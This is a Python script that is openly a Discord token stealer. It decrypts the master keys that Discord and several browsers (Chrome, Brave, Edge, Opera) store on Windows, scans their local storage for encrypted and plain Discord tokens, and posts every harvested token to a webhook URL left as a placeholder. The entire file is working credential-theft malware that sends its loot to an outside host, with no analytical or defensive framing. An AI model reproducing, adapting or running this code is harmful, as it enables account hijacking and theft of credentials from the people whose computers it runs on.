import os
import re
import json
import base64
from pathlib import Path
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
import requests

WEBHOOK_URL = "Yourwebhookurl"

def get_master_key(local_state_path):
    try:
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = CryptUnprotectData(encrypted_key[5:], None, None, None, 0)[1]
        return master_key
    except Exception:
        return None

def decrypt_token(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)[:-16].decode("utf-8")
        return decrypted_pass
    except Exception:
        return None

def send_webhook(tokens):
    if not tokens:
        print("[-] No tokens found during the scan.")
        return
    
    formatted_tokens = "\n".join([f"`{t}`" for t in tokens])
    payload = {
        "content": f"**🔑 Harvested Discord Tokens ({len(tokens)}):**\n{formatted_tokens}"
    }
    
    headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0'
    }
    
    try:
        response = requests.post(WEBHOOK_URL, data=json.dumps(payload), headers=headers)
        print(f"[+] Webhook dispatch attempted. Status code: {response.status_code}")
    except Exception as e:
        print(f"[-] Webhook error: {e}")

def find_all_tokens():
    appdata = Path(os.getenv("LOCALAPPDATA", ""))
    roaming = Path(os.getenv("APPDATA", ""))
    
    paths = {
        "Discord": roaming / "discord" / "Local Storage" / "leveldb",
        "Discord Canary": roaming / "discordcanary" / "Local Storage" / "leveldb",
        "Discord PTB": roaming / "discordptb" / "Local Storage" / "leveldb",
        "Google Chrome": appdata / "Google" / "Chrome" / "User Data" / "Default" / "Local Storage" / "leveldb",
        "Brave": appdata / "BraveSoftware" / "Brave-Browser" / "User Data" / "Default" / "Local Storage" / "leveldb",
        "Edge": appdata / "Microsoft" / "Edge" / "User Data" / "Default" / "Local Storage" / "leveldb",
        "Opera": roaming / "Opera Software" / "Opera Stable" / "Local Storage" / "leveldb",
        "Opera GX": roaming / "Opera Software" / "Opera GX Stable" / "Local Storage" / "leveldb"
    }
    
    state_paths = {
        "Discord": roaming / "discord" / "Local State",
        "Discord Canary": roaming / "discordcanary" / "Local State",
        "Discord PTB": roaming / "discordptb" / "Local State",
        "Google Chrome": appdata / "Google" / "Chrome" / "User Data" / "Local State",
        "Brave": appdata / "BraveSoftware" / "Brave-Browser" / "User Data" / "Local State",
        "Edge": appdata / "Microsoft" / "Edge" / "User Data" / "Local State",
        "Opera": roaming / "Opera Software" / "Opera Stable" / "Local State",
        "Opera GX": roaming / "Opera Software" / "Opera GX Stable" / "Local State"
    }

    found_tokens = set()

    for name, path in paths.items():
        if not path.exists():
            continue
        
        master_key = None
        state_path = state_paths.get(name)
        if state_path and state_path.exists():
            master_key = get_master_key(state_path)

        for file_path in path.glob("*.ldb"):
            try:
                with open(file_path, "r", errors="ignore") as f:
                    content = f.read()
            except Exception:
                continue

            if master_key:
                encrypted_matches = re.findall(r"dQw4w9WgXcQ:([^\"]*)", content)
                for enc_str in encrypted_matches:
                    try:
                        decoded_bytes = base64.b64decode(enc_str)
                        decrypted = decrypt_token(decoded_bytes, master_key)
                        if decrypted:
                            found_tokens.add(decrypted)
                    except Exception:
                        continue

            unencrypted_matches = re.findall(r"[\w-]{24}\.[\w-]{6}\.[\w-]{27,110}|mfa\.[\w-]{84}", content)
            for token in unencrypted_matches:
                found_tokens.add(token)

    return list(found_tokens)

if __name__ == "__main__":
    print("[*] Scanning system for tokens...")
    tokens = find_all_tokens()
    print(f"[*] Scan complete. Found {len(tokens)} token(s). Dispatching to webhook...")
    send_webhook(tokens)